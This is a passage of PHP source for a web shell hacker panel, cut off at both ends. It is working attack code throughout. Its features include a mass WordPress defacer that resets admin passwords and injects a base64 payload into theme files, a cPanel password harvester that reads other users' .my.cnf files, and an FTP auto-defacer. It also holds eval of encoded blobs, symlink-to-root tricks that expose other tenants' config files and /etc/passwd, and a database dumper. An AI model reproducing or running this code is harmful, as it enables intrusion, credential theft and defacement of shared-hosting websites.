color=\"green\">success..</font><br>";
                                        } else {
                                            echo"<tr><td><a href=".$url." onclick=\"window.open(this.href);return 
false;\">".$domain."</a></td><td>".$owner["name"]."</td><td><a href=".$config.">Joomla</a></td><td><font color=\"red\">mysql 
fail</font></td>";
                                        }

                                    }

                                }

                            }

                        }

                    }

                }

                break;
            case"wp_def":
                $user="admin";
                $pass="foo";
                echo"<div align=\"center\">
<form action=\"\" method=\"POST\">
<label>Deface URL: </label> <input type=\"text\" style=\"width:450px;\" name=\"deface_page\"><br />
<input type=\"submit\" value=\"DEFACE\">
</form>
";
                
                if($_POST){
                    $deface=file_get_contents(trim($_POST["deface_page"]));
                    
                    if(is_readable("/var/named")){
                        echo"<table align=\"center\" border=\"1\" width=\"45%\" cellspacing=\"0\" cellpadding=\"4\">";
                        echo"<tr><td><b>DOMAIN</b></td><td>USER</td><td>CMS</td><td>STATUS</b></td><td>DEF URL</td>";
                        $list=scandir("/var/named");
                        foreach($list as$domain){
                            
                            if(strpos($domain,".db")){
                                $domain=str_replace(".db","",$domain);
                                $owner=posix_getpwuid(fileowner("/etc/valiases/".$domain));
                                $url="http://".$domain;
                                
                                if(chk_header($pageURL."ciprut/".$owner["name"]."-WordPress.txt")){
                                    $config=$pageURL."ciprut/".$owner["name"]."-WordPress.txt";
                                    file_get_contents($pageURL."ciprut/".$owner["name"]."-WordPress.txt");
                                    $cnf=file_get_contents($pageURL."ciprut/".$owner["name"]."-WordPress.txt");
                                    $hostname=Find($cnf,"define('DB_HOST', '","');");
                                    $username=Find($cnf,"define('DB_USER', '","');");
                                    $password=Find($cnf,"define('DB_PASSWORD', '","');");
                                    $dbname=Find($cnf,"define('DB_NAME', '","');");
                                    $prefix=Find($cnf,"table_prefix  = '","'");
                                    $link=mysql_connect($hostname,$username,$password);
                                    
                                    if($link){
                                        $hash=crypt($pass);
                                        mysql_select_db($dbname,$link);
                                        $tab=$prefix."users";
                                        $query2=@mysql_query("UPDATE `$tab`  SET `user_login` ='$user'");
                                        $query3=@mysql_query("UPDATE `$tab`  SET `user_pass` ='$hash'");
                                        $req=@mysql_query("SELECT * from  `".$prefix."options` WHERE option_name='home'");
                                        $data=mysql_fetch_array($req);
                                        $site_url=$data["option_value"];
                                        error_reporting(0);
                                        echo"<tr><td><a href=".$url." onclick=\"window.open(this.href);return 
false;\">".$domain."</a></td><td>".$owner["name"]."</td><td><a href=".$config.">WordPress</a></td><td><font color=\"green\">[#] 
User Pass Changed </font><br>";
                                        $post="log=admin&pwd=foo&rememberme=forever&wp-submit=Log In&testcookie=1";
                                        $def="<? echo(stripslashes(base64_decode('".urlencode(base64_encode(str_replace("'","'",($deface))))."'))); 
exit; ?>";
                                        $buffer0=CurlPage($site_url."/wp-login.php",$post);
                                        
                                        if(!preg_match("/logout/i",$buffer0)){
                                            echo"<font color='red'>[X] FAILED TO LOGIN</font><br />";
                                        } else {
                                            echo"<font color='green'>[#] LOGGED IN :D</font><br>";
                                            $urlz=$site_url."/wp-admin/theme-editor.php";
                                            $themeditor=CurlPage($urlz,$cookie,null);
                                            
                                            if(preg_match("/update file/i",$themeditor)){
                                                echo"theme-editor opened<br /></td>";
                                            } else {
                                                echo"error 
opening theme edtitor!</td>";
                                            }

                                            $nola=explode(Chr(10),$themeditor);
                                            foreach($nola as$nline){
                                                
                                                if(preg_match("%theme-editor\.php\\?file=%",$nline)&&preg_match("%\\((404\\.php|archive\\.php|comment\.php)\)%",strtolower($nline))){
                                                    $modify[Find($nline,"(",")")]=Find($nline,"<a href=\"","\"");
                                                }

                                            }

                                            echo"<td>";
                                            
                                            if(is_array($modify)){
                                                foreach($modify as$met=>$indfile){
                                                    $nri=str_replace(".","_",$met);
                                                    $nri="n".$nri;
                                                    $indfile=str_replace("&amp;","&",$indfile);
                                                    $url=trim($site_url."/wp-admin/".$indfile);
                                                    $themepage=CurlPage($url,"");
                                                    $_wpnonce=Find($themepage,"name=\"_wpnonce\" value=\"","\"");
                                                    $_file=Find($themepage,"name=\"file\" value=\"","\"");
                                                    $nfile=explode("themes",$_file);
                                                    $jfile=$site_url."/wp-content/themes".end($nfile);
                                                    $url=$site_url."/wp-admin/theme-editor.php";
                                                    $postme="newcontent=".$def."&action=update&file=".$_file."&_wpnonce=".$_wpnonce."&submit=Update File";
                                                    $themedied=CurlPage($url,$postme);
                                                    
                                                    if(preg_match("%<div id=\"message\" class=\"updated\">%",$themedied)){
                                                        $theme=Find($themeditor,"<li><a href=\"theme-editor.php?file=404.php&amp;theme=","\">404 Template");
                                                        
                                                        if(preg_match("/twenty ten/i",$theme)){
                                                            $theme="twentyten";
                                                        }

                                                        elseif(preg_match("/twenty eleven/i",$theme)){
                                                            $theme="twentyeleven";
                                                        }

                                                        $theme=trim(str_replace("/","",$theme));
                                                        $d=$site_url."/wp-content/themes/".$theme."/404.php";
                                                        listall("wp.txt",$d.Chr(10));
                                                    }

                                                }

                                                echo"<a href=".$d.">LINK</a><br />";
                                                echo"</td>";
                                            }

                                        }

                                    } else {
                                        echo"<tr><td><a href=".$url." onclick=\"window.open(this.href);return 
false;\">".$domain."</a></td><td>".$owner["name"]."</td><td><a href=".$config.">WordPress</a></td><td><font color=\"red\">[x] 
mysql fail</font></td>";
                                    }

                                }

                            }

                        }

                    }

                }

                break;
            case"uploader":
                echo"<center><form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">";
                echo"<center><input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" 
value=\"Upload\"></form></center>";
                
                if($_POST["_upl"]=="Upload"){
                    
                    if(@copy($_FILES["file"]["tmp_name"],$_FILES["file"]["name"])){
                        echo"<p align=\"center\"><font face=\"Verdana\" 
size=\"1\"><font color=\"white\"> Done !!</font><br>";
                    } else {
                        echo"<font color=\"#FF0000\">Failed :( </font></p>
	</td></table></tr>
";
                    }

                }

        }

    }
}
elseif(isset($_GET['x']) && ($_GET['x'] == 'private')){
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=private" method="post">
<b><center>love you Salsha :* i have (mpc)</b>
</form>

<?php }


elseif(isset($_GET['x']) && ($_GET['x'] == 'phpinfo')){ 
	@ob_start();
	@eval("phpinfo();");
	$buff = @ob_get_contents();
	@ob_end_clean();	
	$awal = strpos($buff,"<body>")+6;
	$akhir = strpos($buff,"</body>");
	echo "<div class=\"phpinfo\">".substr($buff,$awal,$akhir-$awal)."</div>";
}
elseif(isset($_GET['view']) && ($_GET['view'] != "")){
  if(is_file($_GET['view'])){ 
	if(!isset($file)) $file = magicboom($_GET['view']);
	if(!$win && $posix){
		$name=@posix_getpwuid(@fileowner($folder));
		$group=@posix_getgrgid(@filegroup($folder));
		$owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name'];
	}
	else {
		$owner = $user;
	}
	$filn = basename($file);
	echo "<table style=\"margin:6px 0 0 2px;line-height:20px;\">
	<tr><td>Filename</td><td><span id=\"".clearspace($filn)."_link\">".$file."</span>
	<form action=\"?y=".$pwd."&amp;view=$file\" method=\"post\" id=\"".clearspace($filn)."_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\">
		<input type=\"hidden\" name=\"oldname\" value=\"".$filn."\" style=\"margin:0;padding:0;\" />
		<input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newname\" value=\"".$filn."\" />
		<input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" />
		<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('".clearspace($filn)."_link','".clearspace($filn)."_form');\" />
	</form>
	</td></tr>
	<tr><td>Size</td><td>".ukuran($file)."</td></tr>
	<tr><td>Permission</td><td>".get_perms($file)."</td></tr>
	<tr><td>Owner</td><td>".$owner."</td></tr>
	<tr><td>Create time</td><td>".date("d-M-Y H:i",@filectime($file))."</td></tr>
	<tr><td>Last modified</td><td>".date("d-M-Y H:i",@filemtime($file))."</td></tr>
	<tr><td>Last accessed</td><td>".date("d-M-Y H:i",@fileatime($file))."</td></tr>
	<tr><td>Actions</td><td><a href=\"?y=$pwd&amp;edit=$file\">edit</a> | <a href=\"javascript:tukar('".clearspace($filn)."_link','".clearspace($filn)."_form');\">rename</a> | <a href=\"?y=$pwd&amp;delete=$file\">delete</a> | <a href=\"?y=$pwd&amp;dl=$file\">download</a>&nbsp;(<a href=\"?y=$pwd&amp;dlgzip=$file\">gzip</a>)</td></tr>
	<tr><td>View</td><td><a href=\"?y=".$pwd."&amp;view=".$file."\">text</a> | <a href=\"?y=".$pwd."&amp;view=".$file."&amp;type=code\">code</a> | <a href=\"?y=".$pwd."&amp;view=".$file."&amp;type=image\">image</a></td></tr>
	</table>
	";
	if(isset($_GET['type']) && ($_GET['type']=='image')){
		echo "<div style=\"text-align:center;margin:8px;\"><img src=\"?y=".$pwd."&amp;img=".$filn."\"></div>";
	}
	elseif(isset($_GET['type']) && ($_GET['type']=='code')){
		echo "<div class=\"viewfile\">";
		$file = wordwrap(@file_get_contents($file),"240","\n");
		@highlight_string($file);
		echo "</div>";
	}
	else {
		echo "<div class=\"viewfile\">";
		echo nl2br(htmlentities((@file_get_contents($file))));
		echo "</div>";
	}
  }
  elseif(is_dir($_GET['view'])){
		echo showdir($pwd,$prompt);
  }
	
}
//////////////////////////////////////////////////
elseif(isset($_GET['edit']) && ($_GET['edit'] != "")){

		if(isset($_POST['save'])){
			$file = $_POST['saveas'];
			$content = magicboom($_POST['content']);
			if($filez = @fopen($file,"w")){
				$time = date("d-M-Y H:i",time());
				if(@fwrite($filez,$content)) $msg = "file saved <span class=\"gaya\">@</span> ".$time;
				else $msg = "failed to save";
				@fclose($filez);
			}
			else $msg = "permission denied";
		}
		if(!isset($file)) $file = $_GET['edit'];
		if($filez = @fopen($file,"r")){
			$content = "";
			while(!feof($filez)){
				$content .= htmlentities(str_replace("''","'",fgets($filez)));
			}
			@fclose($filez);
		}
	
?>
<form action="?y=<?php echo $pwd; ?>&amp;edit=<?php echo $file; ?>" method="post">
<table class="cmdbox">
<tr><td colspan="2">
<textarea class="output" name="content">
<?php echo $content; ?>
</textarea>
<tr><td colspan="2">Save as <input onMouseOver="this.focus();" id="cmd" class="inputz" type="text" name="saveas" style="width:60%;" value="<?php echo $file; ?>" /><input class="inputzbut" type="submit" value="Save !" name="save" style="width:12%;" />
&nbsp;<?php echo $msg; ?></td></tr>
</table>
</form>
<?php
}
elseif(isset($_GET['x']) && ($_GET['x'] == 'logout'))
{	
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=logout" method="post">

<?php
    unset($_SESSION[md5($_SERVER['HTTP_HOST'])]); 
    echo '<center><b>logged out</b></center>'; 
}
elseif(isset($_GET['x']) && ($_GET['x'] == 'cpanel'))
			{	
			?>
			
		<a href="?<?php echo "path=".$path; ?>&amp;x=brute><input class=inputzbut type=submit value="cpanel bruteforce" /></a>
		<a href="?<?php echo "path=".$path; ?>&amp;x=cpcrack"><input class=inputzbut type=submit value="cpanel finder/cracker" /></a><br>
		<a href="?<?php echo "path=".$path; ?>&amp;x=cpdef"><input class=inputzbut type=submit value="cpanel deface" /></a>
		<a href="?<?php echo "path=".$path; ?>&amp;x=brute"><input class=inputzbut type=submit value="cpanel brute force" /></a>
	<?php
	}
elseif(isset($_GET['x']) && ($_GET['x'] == 'cpcrack'))
	{
	?>
				<form action="?y=<?php echo $pwd; ?>&amp;x=brute" method="post">
	<?php
 
@ini_set('display_errors',0);
function entre2v2($text,$marqueurDebutLien,$marqueurFinLien,$i=1){
    $ar0=explode($marqueurDebutLien, $text);
    $ar1=explode($marqueurFinLien, $ar0[$i]);
    return trim($ar1[0]);
}

echo '<h1>Cpanel Finder/Cracker</h1><br/>';
 
echo "<center>";
$d0mains = @file('/etc/named.conf');
$domains = scandir("/var/named");
 
if ($domains or $d0mains)
{
    $domains = scandir("/var/named");
    if($domains) {
echo "<table align='center'><tr><th> COUNT </th><th> DOMAIN </th><th> USER </th><th> Password </th><th> .my.cnf </th></tr>";
$count=1;
$dc = 0;
$list = scandir("/var/named");
foreach($list as $domain){
if(strpos($domain,".db")){
$domain = str_replace('.db','',$domain);
$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
$dirz = '/home/'.$owner['name'].'/.my.cnf';
$path = getcwd();
 
if (is_readable($dirz)) {
copy($dirz, ''.$path.'/'.$owner['name'].'.txt');
$p=file_get_contents(''.$path.'/'.$owner['name'].'.txt');
$password=entre2v2($p,'password="','"');
echo "<tr><td>".$count++."</td><td><a href='http://".$domain.":2082' target='_blank'>".$domain."</a></td><td>".$owner['name']."</td><td>".$password."</td><td><a href='".$owner['name'].".txt' target='_blank'>Click Here</a></td></tr>";
$dc++;
}
 
}
}
echo '</table>';
$total = $dc;
echo '<br><div class="result">Total cPanel Found = '.$total.'</h3><br />';
echo '</center>';
}else{
$d0mains = @file('/etc/named.conf');
    if($d0mains) {
echo "<table align='center'><tr><th> COUNT </th><th> DOMAIN </th><th> USER </th><th> Password </th><th> .my.cnf </th></tr>";
$count=1;
$dc = 0;
$mck = array();
foreach($d0mains as $d0main){
    if(@eregi('zone',$d0main)){
        preg_match_all('#zone "(.*)"#',$d0main,$domain);
        flush();
        if(strlen(trim($domain[1][0])) >2){
            $mck[] = $domain[1][0];
        }
    }
}
$mck = array_unique($mck);
$usr = array();
$dmn = array();
foreach($mck as $o) {
    $infos = @posix_getpwuid(fileowner("/etc/valiases/".$o));
    $usr[] = $infos['name'];
    $dmn[] = $o;
}
array_multisort($usr,$dmn);
$dt = file('/etc/passwd');
$passwd = array();
foreach($dt as $d) {
    $r = explode(':',$d);
    if(strpos($r[5],'home')) {
        $passwd[$r[0]] = $r[5];
    }
}
$l=0;
$j=1;
foreach($usr as $r) {
$dirz = '/home/'.$r.'/.my.cnf';
$path = getcwd();
if (is_readable($dirz)) {
copy($dirz, ''.$path.'/'.$r.'.txt');
$p=file_get_contents(''.$path.'/'.$r.'.txt');
$password=entre2v2($p,'password="','"');
echo "<tr><td>".$count++."</td><td><a target='_blank' href=http://".$dmn[$j-1].'/>'.$dmn[$j-1].' </a></td><td>'.$r."</td><td>".$password."</td><td><a href='".$r.".txt' target='_blank'>Click Here</a></td></tr>";
$dc++;
                flush();
                $l=$l?0:1;
                $j++;
                                }
            }
                        }
echo '</table>';
$total = $dc;
echo '<br><h3>Total cPanel Found = '.$total.'</h3><br />';
echo '</center>';
 
}
}else{
echo "<h3><i><font color='red'>ERROR</font><br><font color='red'>/var/named</font> or <font color='red'>etc/named.conf</font> Not Accessible!</i></h3>";
}

echo "</body></html>";
?>
<?php	}
elseif(isset($_GET['x']) && ($_GET['x'] == 'cpdef'))
	{
	?>
		<form action="?path=<?php echo $path; ?>&amp;x=cpdef" method="post">
<?php
$head = '<html>
<head>
<title>Auto Cpanel Defacer</title>
<script language=\'javascript\'>
function hide_div(id)
{
  document.getElementById(id).style.display = \'none\';
  document.cookie=id+\'=0;\';
}
function show_div(id)
{
  document.getElementById(id).style.display = \'block\';
  document.cookie=id+\'=1;\';
}
function change_divst(id)
{
  if (document.getElementById(id).style.display == \'none\')
    show_div(id);
  else
    hide_div(id);
}
</script>'; ?>
<html>
    <head>
        <?php 
        echo $head ;
        echo '

<table width="100%" cellspacing="0" cellpadding="0" class="tb1" >
       <td width="100%" align=center valign="top" rowspan="1">
       <div class="hedr"> 
        <td height="10" align="left" class="td1"></td></tr><tr><td width="100%" align="center" valign="top" rowspan="1"><font color="red" face="comic sans ms"size="1"><b> 
        <br><font face="Andalus" size="4" color=#58FAF4>Cpanel Auto Defacer</font><br> 
		<br><br>  
		<font color="RED" face="gothic" size="3"></font><br>
           </table>
'; 
?>


<body bgcolor=black><h6 style="text-align:center"><font color=white>
<p><form method=post>
    server ip:&nbsp<input class=inputzbut type=text name=hi value=ip>
    username:&nbsp<input class=inputzbut type=text name=tx value=>&nbsp&nbsp
    password:<input class=inputzbut type=text name=p value=><p>
    file that you want to deface: <input class=inputzbut type=text name=ph value="index.php">
     <p><font color=red size=3>Deface page link : </font>
		 <textarea rows=1 cols=50 class=inputzbut name=deface value="your daface page link">
		 </textarea>
    <p><input class=inputzbut type=submit name=sm value="Submit" /><br>
    </form>
<?php

if(isset($_POST['sm']))
{
    $ip=trim($_POST['hi']);
    $u=trim($_POST['tx']);
    $p=trim($_POST['p']);
    $d=trim($_POST['ph']);
    $df=trim($_POST['deface']);
    echo "<br><font color=white size=2>";
    echo "<font color=red size=3>server ip :</font>&nbsp".$ip;
    echo "<br><font color=red size=3>user :</font> &nbsp".$u;
    echo "<br><font color=red size=3>password :</font> &nbsp".$p;
    echo "<br><font color=red size=3>dirctory :</font> &nbsp".$d;
    echo "<br><font color=red size=3>deface link :</font><br>".$df."<br>";
    $dl="public_html/".$d;
    $si= ftp_connect($ip);    

$try= ftp_login($si,$u,$p);
if ((!$si) || (!$try))
{
        echo "<br>could not connected :(";
        exit;
}
else
{
        echo "<br>connection done<br><br>";
}
$deface = ftp_put($si, $dl , $df, FTP_BINARY);
if ($deface)
{
        echo "hell yesh page got defaced successfully";
}
else
{
        echo "try manually :(";
}
    }
?>
	</strong>	
	</td>
    				</tr>
    <tr>
    <td valign="top" bgcolor="#151515" style="width: 139px"><strong>Desible Function</strong></td>
    <td valign="top" bgcolor="#151515" colspan="5">
	<strong>
<form method="POST" target="_blank">
	<strong>
<input name="matikan" type="hidden" value="sekatan">        				
    </strong>

<?php
if(''==($func=@ini_get('disable_functions')))
{
echo "<font color=white>No Security for Function</font></b>";
}else{
echo '<script>alert("Please see below and press >Please Click Here First!<");</script>';
echo "<font color=red>$func</font></b>";
echo '<tr><td valign="top" bgcolor="#151515" style="width: 139px"></td>';
echo '<td valign="top" bgcolor="#151515" colspan="5"><strong><input type="submit" value="Please Click Here First!">
    </strong>
    </td></tr>';
}
?></strong></td></tr></table></table></table>
<?php
}
///////////////////////////////////////////////////////////////////////////
elseif(isset($_GET['x']) && ($_GET['x'] == 'jumping')){ @eval(gzinflate(base64_decode($jumper))); "</div>"; }
elseif(isset($_GET['x']) && ($_GET['x'] == 'zonekerupuk')){ @eval(gzinflate(base64_decode($zonekerupuk))); "</div>"; }
#################################################################
########################################
########################
#####################
# START HERE
//ini sym file
////////////////////////////////////////////////////////////////////////////////////////////////////////////
elseif(isset($_GET['x']) && ($_GET['x'] == 'sf')) {@set_time_limit(0);@mkdir('sym',0777);error_reporting(0);
$htaccess  = "Options all \n DirectoryIndex gaza.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
$op =@fopen ('sym/.htaccess','w');
fwrite($op ,$htaccess);
echo '<br><br><center><h2>Symlink File !</h2></center><center><br>
<div class="mybox"><h2 class="k2ll33d2">Symlink</h2><br>
<form method="post"> File Path:<br>
<input class="inputz" type="text" name="file" value="/home/user/public_html/config.php" size="60"/>
<br>Symlink Name<br><input class="inputz" type="text" name="symfile" value="s.txt" size="60"/><br><br>
<input class="inputzbut" type="submit" value="symlink" name="symlink" /><br><br></form></div></center>';
$target = $_POST['file'];
$symfile = $_POST['symfile'];
$symlink = $_POST['symlink'];
if ($symlink) {@symlink("$target","sym/$symfile");
echo '<br><center><a target="_blank" href="sym/'.$symfile.'" >'.$symfile.'</a><br><br><br><br></center>';}}
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//sym sec
elseif(isset($_GET['x']) && ($_GET['x'] == 'sec')){
$d0mains = @file("/etc/named.conf");
##httaces
if($d0mains){
@mkdir("k2",0777);
@chdir("k2");
@exe("ln -s / root");
$file3 = 'Options all
DirectoryIndex Sux.html
AddType text/plain .php 
AddHandler server-parsed .php 
AddType text/plain .html 
AddHandler txt .html 
Require None 
Satisfy Any';
$fp3 = fopen('.htaccess','w');
$fw3 = fwrite($fp3,$file3);@fclose($fp3);
echo "<br><br><center><h2>Symlink Server !</h2></center><br><br>
<table align=center border=1 style='width:60%;border-color:#333333;'>
<tr>
<td align=center><font size=3>S. No.</font></td>
<td align=center><font size=3>Domains</font></td>
<td align=center><font size=3>Users</font></td>
<td align=center><font size=3>Symlink</font></td>
</tr>";
$dcount = 1;
foreach($d0mains as $d0main){
if(eregi("zone",$d0main)){preg_match_all('#zone "(.*)"#', $d0main, $domains);
flush();
if(strlen(trim($domains[1][0])) > 2){
$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
echo "<tr align=center><td><font size=3>" . $dcount . "</font></td>
<td align=left><a href=http://www.".$domains[1][0]."/><font class=txt>".$domains[1][0]."</font></a></td>
<td>".$user['name']."</td>
<td><a href='/k2/root/home/".$user['name']."/public_html' target='_blank'><font class=txt>Symlink</font></a></td></tr>"; 
flush();
$dcount++;}}}
echo "</table>";
}else{
$TEST=@file('/etc/passwd');
if ($TEST){
@mkdir("k2",0777);
@chdir("k2");
exe("ln -s / root");
$file3 = 'Options all 
 DirectoryIndex Sux.html 
 AddType text/plain .php 
 AddHandler server-parsed .php 
  AddType text/plain .html 
 AddHandler txt .html 
 Require None 
 Satisfy Any';
 $fp3 = fopen('.htaccess','w');
 $fw3 = fwrite($fp3,$file3);
 @fclose($fp3);
 echo "<br><br><center><h2>Symlink Server !</h2></center><br><br>
 <table align=center border=1><tr>
 <td align=center><font size=4>S. No.</font></td>
 <td align=center><font size=4>Users</font></td>
 <td align=center><font size=4>Symlink</font></td></tr>";
 $dcount = 1;
 $file = fopen("/etc/passwd", "r") or exit("Unable to open file!");
 while(!feof($file)){
 $s = fgets($file);
 $matches = array();
 $t = preg_match('/\/(.*?)\:\//s', $s, $matches);
 $matches = str_replace("home/","",$matches[1]);
 if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
 continue;
 echo "<tr><td align=center><font size=3>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
 echo "<td align=center><font class=txt><a href=/k2/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}fclose($file);
 echo "</table>";}else{if($os != "Windows"){@mkdir("k2",0777);@chdir("k2");@exe("ln -s / root");$file3 = 'Options all 
 DirectoryIndex Sux.html
 AddType text/plain .php
 AddHandler server-parsed .php 
  AddType text/plain .html 
 AddHandler txt .html 
 Require None 
 Satisfy Any';
 $fp3 = fopen('.htaccess','w');
 $fw3 = fwrite($fp3,$file3);@fclose($fp3);
 echo "<br><br><center><h2>Symlink Server !</h2></center><br><br><center>
 <div class='mybox'><h2 class='k2ll33d2'>server symlinker</h2>
 <table align=center border=1><tr>
 <td align=center><font size=4>id</font></td>
 <td align=center><font size=4>Users</font></td>
 <td align=center><font size=4>Symlink</font></td></tr>";
 $temp = "";$val1 = 0;$val2 = 1000;
 for(;$val1 <= $val2;$val1++) {$uid = @posix_getpwuid($val1);
 if ($uid)$temp .= join(':',$uid)."\n";}
 echo '<br/>';$temp = trim($temp);$file5 = 
 fopen("test.txt","w");
 fputs($file5,$temp);
 fclose($file5);$dcount = 1;$file = 
 fopen("test.txt", "r") or exit("Unable to open file!");
 while(!feof($file)){$s = fgets($file);$matches = array();
 $t = preg_match('/\/(.*?)\:\//s', $s, $matches);$matches = str_replace("home/","",$matches[1]);
 if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
 continue;
 echo "<tr><td align=center><font size=3>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
 echo "<td align=center><font class=txt><a href=/k2/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}
 fclose($file);
 echo "</table></div></center>";unlink("test.txt");
 } else 
 echo "<center><font size=4>Cannot create Symlink</font></center>";
 }
 }
 }
/////////////////////////////////////////////////////////////////
## db dump
elseif(isset($_GET['x']) && ($_GET['x'] == 'dump'))
    {
    ?>
    <form action="?y=<?php echo $pwd; ?>&x=dump" method="post">
    <?php
echo $head.'<p align="center">';
echo '
<table width=371 class=tabnet >
<tr><th colspan="2">Database Dump</th></tr>
<tr>
	<td>Server </td>
	<td><input class="inputz" type=text name=server size=52></td></tr><tr>
	<td>Username</td>
	<td><input class="inputz" type=text name=username size=52></td></tr><tr>
	<td>Password</td>
	<td><input class="inputz" type=text name=password size=52></td></tr><tr>
	<td>DataBase Name</td>
	<td><input class="inputz" type=text name=dbname size=52></td></tr>
	<tr>
	<td>DB Type </td>
	<td><form method=post action="'.$me.'">
	<select class="inputz" name=method>
		<option  value="gzip">Gzip</option>
		<option value="sql">Sql</option>
		</select>
	<input class="inputzbut" type=submit value="  Dump!  " ></td></tr>
	</form></center></table>';
if ($_POST['username'] && $_POST['dbname'] && $_POST['method']){
$date = date("Y-m-d");
$dbserver = $_POST['server'];
$dbuser = $_POST['username'];
$dbpass = $_POST['password'];
$dbname = $_POST['dbname'];
$file = "Dump-$dbname-$date";
$method = $_POST['method'];
if ($method=='sql'){
$file="Dump-$dbname-$date.sql";
$fp=fopen($file,"w");
}else{
$file="Dump-$dbname-$date.sql.gz";
$fp = gzopen($file,"w");
}
function write($data) {
global $fp;
if ($_POST['method']=='ssql'){
fwrite($fp,$data);
}else{
gzwrite($fp, $data);
}}
mysql_connect ($dbserver, $dbuser, $dbpass);
mysql_select_db($dbname);
$tables = mysql_query ("SHOW TABLES");
while ($i = mysql_fetch_array($tables)) {
    $i = $i['Tables_in_'.$dbname];
    $create = mysql_fetch_array(mysql_query ("SHOW CREATE TABLE ".$i));
    write($create['Create Table'].";\n\n");
    $sql = mysql_query ("SELECT * FROM ".$i);
    if (mysql_num_rows($sql)) {
        while ($row = mysql_fetch_row($sql)) {
            foreach ($row as $j => $k) {
                $row[$j] = "'".mysql_escape_string($k)."'";
            }
            write("INSERT INTO $i VALUES(".implode(",", $row).");\n");
        }
    }
}
if ($method=='ssql'){
fclose ($fp);
}else{
gzclose($fp);}
header("Content-Disposition: attachment; filename=" . $file);   
header("Content-Type: application/download");
header("Content-Length: " . filesize($file));
flush();

$fp = fopen($file, "r");
while (!feof($fp))
{
    echo fread($fp, 65536);
    flush();
} 
fclose($fp); 
}

}

/* Goblok 
   start here */
// domain viewer by S1r_V1ru5 rec0de by Kapaljetz666 
      elseif(isset($_GET['x']) && ($_GET['x'] == 'dv')){ @ini_set('output_buffering',0); 
{
   ?>
    <form action="?y=<?php echo $pwd; ?>&x=dv" method="post">
	<center><h2>Domain Viewer by S1r_V1ru5<br>notes: if blank(no domain) that mean not work use domain viewer, you can use symlink server</center><br><br>
	<?php
	function openBaseDir()
{
$openBaseDir = ini_get("open_basedir");
if (!$openBaseDir)
    {
        $openBaseDir = '<font color="green">OFF</font>';
    }
    else 
    {
        $openBaseDir = '<font color="red">ON</font>';
    }    
    return $openBaseDir;
}


echo '
    <table width="95%" cellspacing="0" cellpadding="0" class="td1" >
    <td height="100" align="left" class="td1">';
    $pg = basename(__FILE__);
    $safe_mode = @ini_get('safe_mode');
    $dir = @getcwd();
	////////////////////////////////////////////////////
	// LET'S PLAY ~
	##.htaccess
@mkdir('pee',0777);
@symlink("/","pee/root");
$htaccss = "Options all 
 DirectoryIndex Sux.html 
 AddType text/plain .php 
 AddHandler server-parsed .php 
  AddType text/plain .html 
 AddHandler txt .html 
 Require None 
 Satisfy Any";
 
file_put_contents("pee/.htaccess",$htaccss);
$etc = file_get_contents("/etc/passwd");
$etcz = explode("\n",$etc);


##Symlink to the ROOT :p
foreach($etcz as $etz){
$etcc = explode(":",$etz);
error_reporting(0);

$current_dir = posix_getcwd();
$dir = explode("/",$current_dir);

symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/wp-config.php',"pee/".$etcc[0].'-WordPress.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/blog/wp-config.php',"pee/".$etcc[0].'-WordPress.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/wp/wp-config.php',"pee/".$etcc[0].'-WordPress.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/site/wp-config.php',"pee/".$etcc[0].'-WordPress.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/config.php',"pee/".$etcc[0].'-PhpBB.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/includes/config.php',"pee/".$etcc[0].'-vBulletin.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/configuration.php',"pee/".$etcc[0].'-Joomla.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/web/configuration.php',"pee/".$etcc[0].'-Joomla.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/joomla/configuration.php',"pee/".$etcc[0].'-Joomla.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/site/configuration.php',"pee/".$etcc[0].'-Joomla.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/conf_global.php',"pee/".$etcc[0].'-IPB.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/inc/config.php',"pee/".$etcc[0].'-MyBB.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/Settings.php',"pee/".$etcc[0].'-SMF.txt');
